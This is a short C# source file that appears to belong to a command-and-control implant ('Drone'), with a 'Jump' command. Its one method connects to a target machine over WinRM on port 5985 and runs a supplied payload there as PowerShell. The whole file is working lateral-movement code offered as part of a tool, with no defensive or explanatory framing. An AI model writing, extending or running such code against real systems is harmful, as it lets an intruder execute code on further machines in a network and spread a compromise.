using System;
using System.Management.Automation.Runspaces;
using System.Text;

namespace Drone.Commands;

public partial class Jump
{
    private static bool JumpWinRm(string target, byte[] payload)
    {
        var uri = new Uri($"http://{target}:5985/WSMAN");
        var wsMan = new WSManConnectionInfo(uri);

        using var rs = RunspaceFactory.CreateRunspace(wsMan);
        rs.Open();

        using var posh = System.Management.Automation.PowerShell.Create();
        posh.Runspace = rs;
        posh.AddScript(Encoding.UTF8.GetString(payload));
        posh.Invoke();

        return true;
    }
}